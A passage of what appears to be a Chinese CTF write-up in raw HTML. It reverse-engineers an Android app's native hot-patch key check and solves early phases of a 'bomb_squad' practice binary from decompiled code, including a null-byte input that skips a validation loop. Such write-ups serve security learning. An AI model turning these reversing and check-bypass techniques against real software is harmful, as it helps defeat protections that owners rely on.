keyword\">boolean</span> <span class=\"token function\">verifyKey</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> paramString<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>paramString<span class=\"token punctuation\">.</span><span class=\"token function\">length</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">3</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token boolean\">false</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"OYUGMCH>YWOCBXF))9/3)YYE\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span><span class=\"token function\">getEncrypttext</span><span class=\"token punctuation\">(</span>paramString<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>将输入进行加密之后与 <code>OYUGMCH&gt;YWOCBXF</code>  进行比较，但是关键的 <code>getEncrypttext</code>  函数又是个 native。</p>\n<p>之前 libreinforce.so 中，在加载完 libcore.so 后，还调用了其中的 resume 方法</p>\n<p><code>resume</code> ：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>v1 <span class=\"token operator\">=</span> a1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  v5 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  v6 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v7 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  v2 <span class=\"token operator\">=</span> <span class=\"token function\">dalvikOrArt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">decryptAndParse</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token function\">getSdkint</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v2 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token function\">resumeArt</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">resumeDalvik</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>v1<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  v3 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v5<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  v4 <span class=\"token operator\">=</span> v6<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v4 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token function\">sub_539C</span><span class=\"token punctuation\">(</span>v3 <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token function\">sub_539C</span><span class=\"token punctuation\">(</span>v3 <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token function\">sub_539C</span><span class=\"token punctuation\">(</span>v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    v3 <span class=\"token operator\">+=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v5 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    operator <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>什么都看不出来。</p>\n<p>看大佬的博客里面说使用了一个安卓的热补丁修复机制。</p>\n<blockquote>\n<p>关于热补丁机制的描述是这样的：</p>\n</blockquote>\n<blockquote>\n<p>在不进行版本更新的情况下，动态的屏蔽掉程序原来存在 BUG 的函数，使用新的函数替代。</p>\n</blockquote>\n<blockquote>\n<p>新函数一般存在于另一个 so 中</p>\n</blockquote>\n<blockquote>\n<p>热补丁的流程主要有：</p>\n</blockquote>\n<blockquote>\n<ol>\n<li>通过函数名找到原来函数的地址偏移（ArtMethod-&gt;dex_code_item_offset_）。</li>\n</ol>\n</blockquote>\n<blockquote>\n<ol start=\"2\">\n<li>将新函数地址偏移替换原函数地址偏移。</li>\n</ol>\n</blockquote>\n<blockquote></blockquote>\n<p>而上述程序也为类似主要流程如下：</p>\n<blockquote>\n<ol>\n<li>分析安卓虚拟机为 dalvik 还是 art，二者热补丁方式不一样。</li>\n</ol>\n</blockquote>\n<blockquote>\n<ol start=\"2\">\n<li>解密解析补丁函数表 (decryptAndParse)</li>\n</ol>\n</blockquote>\n<blockquote>\n<ol start=\"3\">\n<li>执行补丁操作</li>\n</ol>\n</blockquote>\n<p>接着在 <code>decryptAndParse</code>  中，对补丁表每字节 + 10，进行解密，解密后的补丁表：</p>\n<p><code>1Lcom/example/originapplication/ProtectedClass;getEncrypttext(Ljava/lang/String;)Ljava/lang/String;1416140</code></p>\n<p>后面这串数字就是新函数的位置。</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2020/png/2658344/1602153561277-64468c80-644f-4811-bef3-a81970468aae.png#align=left&amp;display=inline&amp;height=677&amp;margin=%5Bobject%20Object%5D&amp;originHeight=677&amp;originWidth=1017&amp;size=0&amp;status=done&amp;style=none&amp;width=1017\" alt=\"\" /></p>\n<p>这部分就是函数的字节码，但是 IDA 没有显示出来汇编，需要手动转换</p>\n<p><s>不会</s></p>\n<p>剩下的参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly9teXByZS5jbi8yMDE4LzEwLzI3L2Jmcy1pc2NjLW1vYmlsZQ==\"> https://mypre.cn/2018/10/27/bfs-iscc-mobile</span></p>\n<h1 id=\"pwn\"><a class=\"anchor\" href=\"#pwn\">#</a> PWN</h1>\n<h2 id=\"bomb_squad\"><a class=\"anchor\" href=\"#bomb_squad\">#</a> bomb_squad</h2>\n<p>首先 checksec 一下</p>\n<figure class=\"highlight powershell\"><figcaption data-lang=\"PowerShell\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token operator\">*</span><span class=\"token punctuation\">]</span> <span class=\"token string\">'/root/work/CLSknpNF3iWUuHCX.bomb_squad'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    Arch:     i386-32-little</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    RELRO:    Partial RELRO</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    Stack:    Canary found</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    NX:       NX enabled</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    PIE:      No PIE <span class=\"token punctuation\">(</span>0x8048000<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这个题目首先由 4 个小关卡，全部通关之后才能达到 getflag 的地方</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl __noreturn <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Welcome to the bomb squad! Your first task: Diffuse this practice bomb.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">phase_1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"You got through phase 1 alright! Good work! But can you handle phase 2?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token function\">phase_2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"You could handle it! Good job... I think you can handle phase 3... right?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token function\">phase_3</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"DAYUM, you got it! You know the drill, time for phase 4.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token function\">phase_4</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token function\">print_flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"phase_1\"><a class=\"anchor\" href=\"#phase_1\">#</a> phase_1</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">phase_1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>v0<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">int</span> result<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Give me a number!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  v0 <span class=\"token operator\">=</span> <span class=\"token function\">get_line</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  result <span class=\"token operator\">=</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span>v0<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">37</span> <span class=\"token operator\">-</span> <span class=\"token number\">18</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> result <span class=\"token operator\">!=</span> <span class=\"token number\">1337</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">explode_bomb</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  phase1_solved <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>关卡 1 接收一个数字，经过一系列计算，使得最终结果要等于 1337，使用 <code>z3-solver</code>  很容易得出解。</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2020/png/2658344/1602153561404-407dcc7b-0104-4e20-8cc0-cc2d0822d2e5.png#align=left&amp;display=inline&amp;height=67&amp;margin=%5Bobject%20Object%5D&amp;originHeight=67&amp;originWidth=510&amp;size=0&amp;status=done&amp;style=none&amp;width=510\" alt=\"\" /></p>\n<h3 id=\"phase_2\"><a class=\"anchor\" href=\"#phase_2\">#</a> phase_2</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">phase_2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Give me an array of numbers!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  s <span class=\"token operator\">=</span> <span class=\"token function\">get_line</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">sscanf</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token string\">\"[%d, %d, %d, %d, %d, %d]\"</span><span class=\"token punctuation\">,</span> v4<span class=\"token punctuation\">,</span> _2C<span class=\"token punctuation\">,</span> _30<span class=\"token punctuation\">,</span> _34<span class=\"token punctuation\">,</span> _38<span class=\"token punctuation\">,</span> _3C<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  result <span class=\"token operator\">=</span> v4<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v4<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token function\">explode_bomb</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    v2 <span class=\"token operator\">=</span> v4<span class=\"token punctuation\">[</span>i <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> v4<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token function\">func2</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v2 <span class=\"token operator\">!=</span> result <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>      <span class=\"token function\">explode_bomb</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  phase2_solved <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>接收一个数组，要求满足 <code>a[0]=1，a[i-1]+a[i]=2^i</code> ，那么结果就是 <code>[1, 1, 3, 5, 11, 21]</code></p>\n<h3 id=\"phase_2-2\"><a class=\"anchor\" href=\"#phase_2-2\">#</a> phase_2</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">phase_3</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  v4 <span class=\"token operator\">=</span> <span class=\"token function\">get_line</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v5 <span class=\"token operator\">=</span> <span class=\"token string\">\"rqzzepiwMLepiwYsLYtpqpvzLsYeM\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    v1 <span class=\"token operator\">=</span> v4<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>v1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    v3 <span class=\"token operator\">=</span> result<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token punctuation\">(</span>_BYTE<span class=\"token punctuation\">)</span>result <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token punctuation\">)</span>result <span class=\"token operator\">&lt;=</span> <span class=\"token number\">96</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token punctuation\">)</span>result <span class=\"token operator\">></span> <span class=\"token number\">123</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>      <span class=\"token function\">explode_bomb</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    v0 <span class=\"token operator\">=</span> v5<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">*</span>v0 <span class=\"token operator\">!=</span> keys<span class=\"token punctuation\">[</span>v3 <span class=\"token operator\">-</span> <span class=\"token number\">97</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>      <span class=\"token function\">explode_bomb</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    lastentered <span class=\"token operator\">=</span> v3<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  phase3_solved <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>  <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>接收一串字符串，要求 keys 里面的字符串要与 v5 的对应。但实际上不需要这么麻烦，</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token punctuation\">(</span>_BYTE<span class=\"token punctuation\">)</span>result <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>当输入为 <code>\\x00</code>  时，就会跳出循环，直接返回。</p>\n<h3 